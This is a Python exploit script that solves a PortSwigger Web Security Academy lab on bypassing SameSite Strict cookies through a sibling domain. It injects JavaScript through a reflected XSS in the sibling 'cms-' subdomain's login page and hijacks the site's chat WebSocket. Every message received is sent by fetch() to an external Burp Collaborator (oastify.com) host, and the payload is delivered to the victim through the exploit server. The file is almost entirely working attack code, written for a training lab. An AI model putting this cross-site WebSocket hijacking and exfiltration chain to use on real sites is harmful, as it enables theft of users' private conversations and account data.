import requests
from urllib3.exceptions import InsecureRequestWarning
from time import sleep
from bs4 import BeautifulSoup
from string import Template
import urllib


requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# lab_url: https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-sibling-domain
# author: 0xyf


class CSRF9:
    def __init__(self):
        self.lab_id = "0afe00530453191b872d035600010046"
        self.proxies = {"https": "http://127.0.0.1:8080"}

        self.url = f"https://{self.lab_id}.web-security-academy.net"
        self.collab_url = "https://4z4fkexv8e8182282tqzxw762x8twlv9k.oastify.com"
        self.login_url = f"{self.url}/login"

    def get_csrf_token(self):
        r = requests.get(f"{self.login_url}")
        soup = BeautifulSoup(r.text, "html.parser")
        self.csrf_token = soup.find("input", attrs={"name": "csrf"})["value"]
        self.cookies = r.cookies

    def get_exploit_srv_url(self):
        r = requests.get(self.url)
        soup = BeautifulSoup(r.text, "html.parser")
        self.exploit_srv_url = soup.find("a", id="exploit-link").get("href")

    def execute_request(self, data):
        r = requests.post(
            f"{self.exploit_srv_url}",
            data=data,
            proxies=self.proxies,
            verify=False,
        )
        return r

    def csrf(self):
        self.get_exploit_srv_url()
        initiate_socket_and_exfil_payload = Template(
            """<script>
            var ws = new WebSocket('wss://$lab_id.web-security-academy.net/chat');
            ws.onopen = function() {
                ws.send("READY");
            };
            ws.onmessage = function(event) {
                fetch('$collab_url', {method: 'POST', mode: 'no-cors', body: event.data});
            };
            </script>"""
        )

        initiate_socket_and_exfil_payload = (
            initiate_socket_and_exfil_payload.substitute(
                lab_id=self.lab_id,
                collab_url=self.collab_url,
            )
        )

        initiate_socket_and_exfil_payload = urllib.parse.quote(
            initiate_socket_and_exfil_payload, safe=""
        )

        payload = Template(
            """<script>
            var baseUrl = "https://cms-$lab_id.web-security-academy.net/login?password=dontexist&username=";
            var relativePath = "$initiate_socket_and_exfil_payload";
            document.location = baseUrl + relativePath;
            </script>"""
        )
        payload = payload.substitute(
            lab_id=self.lab_id,
            initiate_socket_and_exfil_payload=initiate_socket_and_exfil_payload,
        )
        data = {
            "urlIsHttps": "on",
            "responseFile": "/exploit",
            "responseHead": "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8",
            "formAction": "DELIVER_TO_VICTIM",
            "responseBody": payload,
        }
        r = self.execute_request(data)

    def login(self):
        self.get_csrf_token()
        self.username = input("Enter username: ")
        self.password = input("Enter password: ")
        print(f"[*] Attempting to Login as {self.username}:{self.password}")
        data = {
            "username": self.username,
            "password": self.password,
            "csrf": self.csrf_token,
        }
        r = requests.post(
            self.login_url,
            cookies=self.cookies,
            data=data,
            proxies=self.proxies,
            verify=False,
        )

    def check_solved(self):
        sleep(2)
        r = requests.get(self.url)
        if "Congratulations, you solved the lab!" in r.text:
            print("Lab Solved")
        else:
            print("Did not solve lab, check payload")

    def solve(self):
        self.csrf()
        self.login()
        self.check_solved()


def main():
    CSRF9().solve()


if __name__ == "__main__":
    main()
